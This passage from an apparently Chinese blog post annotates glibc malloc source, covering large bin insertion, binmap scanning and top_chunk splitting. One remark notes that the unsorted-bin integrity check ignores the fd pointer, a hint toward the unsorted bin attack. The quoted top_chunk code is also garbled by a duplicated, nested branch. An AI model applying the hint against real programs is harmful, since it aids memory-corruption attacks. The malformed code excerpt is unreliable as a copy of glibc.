class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是<code>small bin</code>，那就得进<code>large bin</code>了，要进<code>large bin</code>。这里要知道，<code>large bin</code>可是所有<code>bin</code>当中最复杂的<code>bin</code>了，一个<code>chunk</code>四个指针，一对<code>bin</code>管理一个二维双向链表，<code>fd</code>,<code>bk</code>指针与相同大小的<code>chunk</code>连接，<code>fd_nextsize</code>和<code>bk_nextsize</code>与不同大小的<code>chunk</code>连接。</p><p>然后呢，虽然<code>fd</code>和<code>bk</code>是连接相同大小的<code>chunk</code>，但是那一对bin还是相当于是<code>fd</code>和<code>bk</code>字段。除了表头以外，其余的不同大小的chunk都是靠<code>fd_nextsize</code>和<code>bk_nextsize</code>的。并且沿着<code>bk_nextsize</code>，<code>chunksize</code>递增。也就是说<code>av-&gt;bin[index]-&gt;bk</code>是第一个<code>chunk</code>，并且<code>size</code> 最小，然后通过<code>bk_nextsize</code>字段一直连接到<code>av-&gt;bin[index]-&gt;fd</code>，反向同理。还有一点需要注意：<code>large bin</code>所在的<code>chunk</code>并不与<code>chunk</code>双向连接。</p><p>这里给出一张<code>large bin</code>的结构图，看看能不能帮助理解一下</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>那么这里的<code>bck</code>指的是<code>bin</code>所在的<code>chunk</code>，<code>fwd</code>指的是最大的这个<code>chunk</code>。</p><p><code>bck-&gt;bk</code>指的就是图上的n号<code>chunk</code>，也是这个<code>large bin</code>中最小的那个<code>chunk</code>，如果拿出来的<code>unsorted bin</code>它比最小的<code>chunk</code>还要小，那就已经可以确定插入在哪了，就不用做下面的循环再看看它在哪了。然后就是一个链表的插入操作，这里要注意的是，<code>bin</code>所在的<code>chunk</code>只有<code>fd</code>和bk指针，而其它<code>chunk</code>都是<code>fd_nextsize</code>和<code>bk_nextsize</code>连接的。我们只需要先在最大块和最小块之间插入，然后把<code>bin-&gt;bk</code>指向<code>victim</code>即可。</p><p>那么我们大概自己写一下操作看看与源码是否一致。首先不考虑bin，只考虑链表的情况下，我们先找到最大块和最小块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd=bin-&gt;fd;</span><br><span class="line">bck=bin-&gt;bk;</span><br><span class="line">victim-&gt;bk_nextsize=bck;</span><br><span class="line">victim-&gt;fd_nextsize=fwd;</span><br><span class="line">fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;</span><br></pre></td></tr></table></figure><p>跟上面大致一样，只不过它这里<code>fwd</code>的值是那个<code>large bin</code>的<code>chunk</code>，直接通过<code>fd</code>指针也能直接找到最大的<code>chunk</code>。所以我后面的主要代码应该把<code>fwd</code>改成<code>fwd-&gt;fd</code>就跟上面一模一样了。</p><p>如果不是，那就接着往<code>bk_nextsize</code>这个指针上面找，找到大于等于的<code>chunk</code>为止。然后如果等于，就只需要用<code>fd</code>和<code>bk</code>指针与相等大小的<code>chunk</code>相连，如果没有相等，就得在<code>fd_nextsize</code>和<code>bk_nextsize</code>方向上插入，然后<code>fd</code>和<code>bk</code>都默认指向自己。这个我就不演试了，跟前面那个基本是一样的。</p><h4 id="第五小块"><a href="#第五小块" class="headerlink" title="第五小块"></a>第五小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line"><span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这个就很简单了，就是一个插入操作，前面既然已经找到了插入的位置，这里一气呵成直接解决了。然后这里还有一个遍历<code>unsorted bin</code>的最大值，一次最多遍历<code>10000</code>个<code>unsorted bin</code>，这个也可以理解，如果我一次产生了很多的<code>unsorted bin</code>，然后我一次<code>malloc</code>，那边一直在循环搞这个<code>unsorted bin</code>，迟迟就没分配内存回来所以这里设定一个最大值。</p><p>到了这里，对<code>unsorted bin</code>的遍历就结束了。</p><h4 id="第六小块"><a href="#第六小块" class="headerlink" title="第六小块"></a>第六小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): cor</span></span><br><span class="line"><span class="string">                    rupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边就看这个最小能满足的<code>nb</code>是否在<code>small bin</code>的范围内。不在则执行，其实如果在的话，那前面有一个<code>small bin</code>的范围判断，如果<code>small bin</code>范围那，<code>idx</code>就是<code>small bin</code>，不在则是<code>large bin</code>的<code>idx</code>。<code>small bin</code>之前已经判断过一遍了，并且判断策略也跟之前不一样，所以这里加一个<code>!in_small_bin_range</code>的判断还是很有必要的。</p><p>来看下面的if语句，两个条件。</p><ol><li><code>(victim = first (bin)) != bin</code>：这个bin里面有<code>chunk</code>，并使<code>victim=bin-&gt;fd</code></li><li><code>(unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)</code>：找到目标chunk的size要大于等于这个最小能满足的size  nb。</li></ol><p>同时满足那么就可能要取这一块chunk来分配了，正如注释所说，如果bin为空或者最大的chunk还是比较小，那就跳过这个逻辑。然后<code>victim = victim-&gt;bk_nextsize</code>，这里<code>victim</code>是最大块，最大块的<code>bk_nextsize</code>就是最小块，这里应该也是尽量寻找最小能满足的块。正如循环所描述，如果<code>victim</code>的<code>chunk size</code>比我所需的最小能满足的<code>chunk size</code> <code>nb</code>还小，那就去寻找比他大的，因为是递增，所以能保证在<code>chunk</code>当中我一定会找到一个最小能满足的<code>chunk</code>。</p><p>这里解释一下两个最小能满足的意思：</p><p>首先<code>nb</code>是指用户需要的最小能满足的块的<code>size</code>，比如我只需要1个字节，但是我最小的<code>chunk size</code>都是<code>0x20</code>了，<code>0x20</code>的<code>chunk</code>就是对用户最小能满足的<code>chunk size</code>了。</p><p>如果能找到<code>size=nb</code>的块，当然是最好不过了，但是现实往往不会那么顺利，比如我只有一个<code>0x30</code>的块，如果我只有<code>0x30</code>而没有<code>0x20</code>的块，那么<code>0x30</code>就是我所有<code>free</code>块当中的最小能满足，其实这里<code>nb</code>应该叫最优能满足，但是我还是习惯这么叫了hhh。</p><p>然后呢找到这个之后就<code>unlink</code>这个块，把它从链中删除，拿出来之后进行一个判断，如果切割之后的块小于MINSIZE，那就不切割了，直接把它物理相邻的下一个快<code>prev_inuse</code>位设1，这个块就直接返回给用户了。否则就是切割，设置各种东西，这个前面有差不多的代码，我们主要看看剩下的块去哪里了，很明显，重新链入<code>unsorted bin</code>了。后面有一个<code>check</code>，如果<code>unsorted bin-&gt;fd-&gt;bk!=unsorted bin</code>，那么报错退出。这里需要注意，它只检测了<code>unsorted bin-&gt;fd-&gt;bk</code>是否等于那个<code>unsorted bin</code>，对于堆块来说我就是只检测了<code>bk</code>指针，这意味着<code>fd</code>指针如果修改为任意值不会在这里被检测到，这是一个利用小技巧，也只有你读过源码后才能好好理解这个<code>unsorted bin attack</code>了。然后如果剩余大小不在<code>small bin</code>范围内把<code>nextsize</code>指针全部清空，其它就是正常返回了。如果被切割的剩下<code>chunk</code>不在<code>small bin</code>范围内，就会清空它的<code>fd_nextsize</code>和<code>bk_nextsize</code>。因为它要回到<code>unsorted bin</code>里面，这两个字段就没什么用了，就会被清空。</p><h4 id="第七小块"><a href="#第七小块" class="headerlink" title="第七小块"></a>第七小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>我们来讲一讲<code>arena</code>的<code>binmap</code>结构，这个用于快速检索一个<code>bin</code>是否为空，每一个<code>bit</code>表示对应的<code>bin</code>中是否存在空闲<code>chunk</code>，虽然不知道为什么前面没有用到。这一段就是说，如果<code>large bin</code>搜索完了都没有找到合适的<code>chunk</code>，那么就去下一个<code>idx</code>里面寻找，这很合理。然后一共有4个int，每个<code>int</code>32位表示一块<code>map</code>，一共表示<code>128</code>位。</p><h4 id="第八小块"><a href="#第八小块" class="headerlink" title="第八小块"></a>第八小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line"><span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看看两个条件</p><ol><li><code>bit&gt;map</code>：如果这个位的权值都比它整个的<code>map</code>都大了，说明<code>map</code>上那个<code>bit</code>的权值必定为0</li><li><code>bit==0</code>：如果这个<code>bit</code>都是0说明这个<code>index</code>也不对。</li></ol><p>满足其一就看看别的<code>index</code>。</p><p>然后如果说<code>map==0</code>，说明这整个<code>block</code>都没有空闲块，就直接跳过，不为0则退出去执行下面的操作，如果超过了<code>block</code>的总数，那就说明<code>unsorted bin</code>和<code>large bin</code>中也没有合适的<code>chunk</code>，那我们就切割<code>top_chunk</code>了，这里用了一个<code>goto</code>跳转，我们后面分析。</p><h4 id="第九小块"><a href="#第九小块" class="headerlink" title="第九小块"></a>第九小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我已经找到了一个合适的<code>block</code>，然后就是看<code>block</code>的各个位了。从低位开始，如果检查到<code>map</code>那一位对应为0就找下一位，我们前面提到bk为<code>large bin</code>的最小块，所以先考虑它，当然不能说<code>map</code>里面说这里有它就有，我还得自己判断一下这个<code>bin</code>里面是不是真的有，如果没有(<code>bin-&gt;bk==bin</code>)，那么我就要及时把标志位清除然后<code>bit&lt;&lt;1</code>去寻找下一个<code>index</code>。</p><h4 id="最后一小块"><a href="#最后一小块" class="headerlink" title="最后一小块"></a>最后一小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">        have to perform a complete insert here.  */</span></span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它确实有<code>chunk</code>呢？然后其实它还是跟前面一样的，在<code>large bin</code>中找到<code>chunk</code>的处理方式，<code>unlink</code>，切割，判断，设置标志位，切割后及时更新<code>last_remainder</code>，这里就是一个<code>large bin</code>的遍历。</p><p>还要讲一下的就是这个<code>check</code>，依旧是对<code>unsorted bin</code>的一个<code>check</code>，判断第一个<code>unsorted chunk</code>的<code>bk</code>指针是否指向<code>unsorted bin</code>的位置。这里需要把割剩下的<code>chunk</code>重新放回<code>unsorted bin</code>。至此整个<code>unsorted bin</code>和<code>large bin</code>的分配就讲完了。</p><h3 id="第六段：切割top-chunk"><a href="#第六段：切割top-chunk" class="headerlink" title="第六段：切割top_chunk"></a>第六段：切割top_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">             (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">             search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">             less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">             be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">             limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">             MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">             exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">             reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">             to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">             here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">/* restore original bin index */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                idx = smallbin_index (nb);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">                alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较简单，就是说先从<code>av-&gt;top</code>拿到<code>top_chunk</code>的地址。判断大小尝试切割，如果不能切割，它也不会尽量去麻烦操作系统，先调用<code>malloc_consolidate</code>去合并所有的<code>fast bin</code>里面的<code>chunk</code>。然后合并之后接着步入之前的循环，重新找一次<code>small bin</code> <code>large bin</code> <code>unsorted 